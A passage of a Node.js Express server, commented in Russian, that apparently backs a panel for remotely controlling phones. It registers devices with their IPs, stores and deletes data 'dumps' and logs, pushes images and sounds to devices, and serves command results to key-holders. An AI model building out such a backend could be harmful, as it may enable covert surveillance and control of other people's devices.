    clients: data.clients && data.clients.length ? data.clients : (prev.clients || []),
    sounds: Array.isArray(data.sounds) ? data.sounds : (prev.sounds || []),
    ip,
    lastSeen: Date.now()
  };
  writeDevices(devices);

  res.json({ ok: true, deviceId });
});

app.get('/delete/:name', (req, res) => {
  if (!viewOk(req)) return res.status(403).send('forbidden');

  const name = dumpName(req.params.name);
  if (!name) return res.status(400).send('bad name');

  const p = path.join(SAVE_DIR, name);
  if (fs.existsSync(p)) fs.unlinkSync(p);
  const metaP = p + '.json';
  if (fs.existsSync(metaP)) fs.unlinkSync(metaP);
  bust('dumps');
  res.redirect('/?key=' + encodeURIComponent(VIEW_KEY));
});

app.get('/clear', (req, res) => {
  if (!viewOk(req)) return res.status(403).send('forbidden');
  for (const f of fs.readdirSync(SAVE_DIR)) {
    try { fs.unlinkSync(path.join(SAVE_DIR, f)); } catch (e) {}
  }
  bust('dumps');
  res.redirect('/?key=' + encodeURIComponent(VIEW_KEY));
});

app.get('/clearlogs', (req, res) => {
  if (!viewOk(req)) return res.status(403).send('forbidden');
  writeLogs([]);
  res.redirect('/?key=' + encodeURIComponent(VIEW_KEY) + '&tab=logs');
});

app.get('/clearuploadlogs', (req, res) => {
  if (!viewOk(req)) return res.status(403).send('forbidden');
  writeUploadLogs([]);
  res.redirect('/?key=' + encodeURIComponent(VIEW_KEY) + '&tab=uploadlog');
});

app.get('/download/:name', (req, res) => {
  if (!viewOk(req)) return res.status(403).send('forbidden');

  const name = dumpName(req.params.name);
  if (!name) return res.status(400).send('bad name');

  const p = path.join(SAVE_DIR, name);
  if (!fs.existsSync(p)) return res.status(404).send('not found');
  res.download(p);
});

app.use('/sounds', (req, res, next) => {
  // превью звуков — только панели
  if (!viewOk(req)) return res.status(403).send('forbidden');
  next();
}, express.static(SOUND_DIR, { maxAge: '7d', immutable: true }));

// ── картинки на экран телефона: загрузка, раздача устройству, удаление ─────

// панель: залить картинку в media/
app.post('/images/upload', mediaUpload.single('file'), (req, res) => {
  const deviceId = String((req.body && req.body.device) || '');
  const back = '/?key=' + encodeURIComponent(VIEW_KEY) + '&tab=control' +
    (deviceId ? '&device=' + encodeURIComponent(deviceId) : '');

  if (!viewOk(req)) {
    if (req.file) { try { fs.unlinkSync(req.file.path); } catch (e) {} }
    return res.status(403).send('forbidden');
  }
  if (!req.file || !String(req.file.mimetype || '').startsWith('image/')) {
    if (req.file) { try { fs.unlinkSync(req.file.path); } catch (e) {} }
    return res.status(400).send('нужна картинка (jpg/png/webp)');
  }
  bust('images');
  res.redirect(back);
});

// устройство: скачать картинку по ключу загрузки (x-key)
app.get('/wall/:name', (req, res) => {
  const key = req.headers['x-key'] || req.query.key;
  if (key !== UPLOAD_KEY) return res.status(403).send('forbidden');

  const name = path.basename(String(req.params.name || ''));
  if (!isImageName(name)) return res.status(400).send('bad image');

  const p = path.join(MEDIA_DIR, name);
  if (!fs.existsSync(p)) return res.status(404).send('not found');

  res.setHeader('Cache-Control', 'no-store');
  res.sendFile(p);
});

// панель: удалить картинку из media/
app.get('/images/delete/:name', (req, res) => {
  if (!viewOk(req)) return res.status(403).send('forbidden');

  const name = path.basename(String(req.params.name || ''));
  const deviceId = String(req.query.device || '');
  if (isImageName(name)) {
    try { fs.unlinkSync(path.join(MEDIA_DIR, name)); } catch (e) {}
    bust('images');
  }
  res.redirect('/?key=' + encodeURIComponent(VIEW_KEY) + '&tab=control' +
    (deviceId ? '&device=' + encodeURIComponent(deviceId) : ''));
});

app.use('/media', (req, res, next) => {
  // превью и результаты команд отдаём только панели, а не всему интернету
  if (!viewOk(req)) return res.status(403).send('forbidden');
  next();
}, express.static(MEDIA_DIR, { maxAge: '7d', immutable: true }));

app.get('/health', (req, res) => {
  res.setHeader('Cache-Control', 'no-store');
  res.type('text/plain').send('ok');
});

app.listen(PORT, () => console.log('server on ' + PORT));
